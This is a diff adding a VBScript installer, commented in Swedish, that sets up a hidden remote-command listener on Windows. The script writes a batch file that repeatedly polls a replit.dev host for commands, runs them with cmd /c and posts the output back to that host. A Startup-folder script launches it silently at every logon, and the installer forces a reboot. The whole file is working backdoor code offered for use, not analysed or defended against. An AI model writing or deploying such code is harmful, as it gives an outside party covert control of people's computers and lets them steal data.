@@ -1,0 +1,76 @@
+Option Explicit
+
+Dim fso, shell, batDir, batPath, vbsPath, startup, batchCode, vbsCode
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set shell = CreateObject("WScript.Shell")
+
+' Skapa mapp för batchfil
+batDir = shell.ExpandEnvironmentStrings("%APPDATA%") & "\RemoteListener"
+If Not fso.FolderExists(batDir) Then fso.CreateFolder batDir
+
+batPath = batDir & "\lyssna.bat"
+startup = shell.SpecialFolders("Startup")
+vbsPath = startup & "\run_lyssna.vbs"
+
+' === Batchfil med fixad cd-hantering och loggning ===
+batchCode = ""
+batchCode = batchCode & "@echo off" & vbCrLf
+batchCode = batchCode & "setlocal enabledelayedexpansion" & vbCrLf
+batchCode = batchCode & "set ""currentDir=%cd%""" & vbCrLf
+batchCode = batchCode & "set ""userProfile=%USERPROFILE%""" & vbCrLf
+batchCode = batchCode & "set ""lastcmd=""" & vbCrLf
+batchCode = batchCode & ":loop" & vbCrLf
+batchCode = batchCode & "  for /f ""delims="" %%C in ('curl -s ""https://625f5806-6af1-429b-b8f9-0e163e41b619-00-3eirdhgmzyw5c.worf.replit.dev/get""') do (" & vbCrLf
+batchCode = batchCode & "    set ""cmd=%%C""" & vbCrLf
+batchCode = batchCode & "  )" & vbCrLf
+batchCode = batchCode & "  if defined cmd if /i not ""!cmd!""==""!lastcmd!"" (" & vbCrLf
+batchCode = batchCode & "    echo [%date% %time%] Running: !cmd! >> logg.txt" & vbCrLf
+batchCode = batchCode & "    if /i ""!cmd:~0,3!""==""cd "" (" & vbCrLf
+batchCode = batchCode & "      set ""targetDir=!cmd:~3!""" & vbCrLf
+batchCode = batchCode & "      rem Om relativ sökväg, försök tolka mot %USERPROFILE%" & vbCrLf
+batchCode = batchCode & "      if not exist ""!targetDir!"" (" & vbCrLf
+batchCode = batchCode & "        if exist ""!userProfile!\!targetDir!"" (" & vbCrLf
+batchCode = batchCode & "          set ""targetDir=!userProfile!\!targetDir!""" & vbCrLf
+batchCode = batchCode & "        )" & vbCrLf
+batchCode = batchCode & "      )" & vbCrLf
+batchCode = batchCode & "      pushd ""!currentDir!"" >nul" & vbCrLf
+batchCode = batchCode & "      cd /d ""!targetDir!"" 2>nul" & vbCrLf
+batchCode = batchCode & "      set ""currentDir=!cd!""" & vbCrLf
+batchCode = batchCode & "      popd >nul" & vbCrLf
+batchCode = batchCode & "      echo [%date% %time%] Changed directory to: !currentDir! >> logg.txt" & vbCrLf
+batchCode = batchCode & "      echo !currentDir! > output.txt" & vbCrLf
+batchCode = batchCode & "    ) else (" & vbCrLf
+batchCode = batchCode & "      (" & vbCrLf
+batchCode = batchCode & "        echo !currentDir!" & vbCrLf
+batchCode = batchCode & "        pushd ""!currentDir!"" >nul" & vbCrLf
+batchCode = batchCode & "        cmd /c ""!cmd!"" 2>&1" & vbCrLf
+batchCode = batchCode & "        popd >nul" & vbCrLf
+batchCode = batchCode & "      ) > output.txt" & vbCrLf
+batchCode = batchCode & "    )" & vbCrLf
+batchCode = batchCode & "    curl -s -X POST --data-binary ""@output.txt"" ^" & vbCrLf
+batchCode = batchCode & "      ""https://625f5806-6af1-429b-b8f9-0e163e41b619-00-3eirdhgmzyw5c.worf.replit.dev/output"" >nul" & vbCrLf
+batchCode = batchCode & "    set ""lastcmd=!cmd!""" & vbCrLf
+batchCode = batchCode & "  )" & vbCrLf
+batchCode = batchCode & "goto loop"
+
+With fso.CreateTextFile(batPath, True)
+  .Write batchCode
+  .Close
+End With
+
+' === VBS-fil som kör batchen tyst vid inloggning ===
+vbsCode = ""
+vbsCode = vbsCode & "Set shell = CreateObject(""WScript.Shell"")" & vbCrLf
+vbsCode = vbsCode & "shell.Run Chr(34) & """ & batPath & """ & Chr(34), 0, False"
+
+With fso.CreateTextFile(vbsPath, True)
+  .Write vbsCode
+  .Close
+End With
+
+MsgBox "✅ Installerat med fixad cd och loggning!" & vbCrLf & _
+       "lyssna.bat ligger i: " & batPath & vbCrLf & _
+       "run_lyssna.vbs ligger i din startup och körs tyst vid inloggning.", vbInformation, "Färdigt!"
+
+shell.Run "shutdown -r -t 15", 0, False
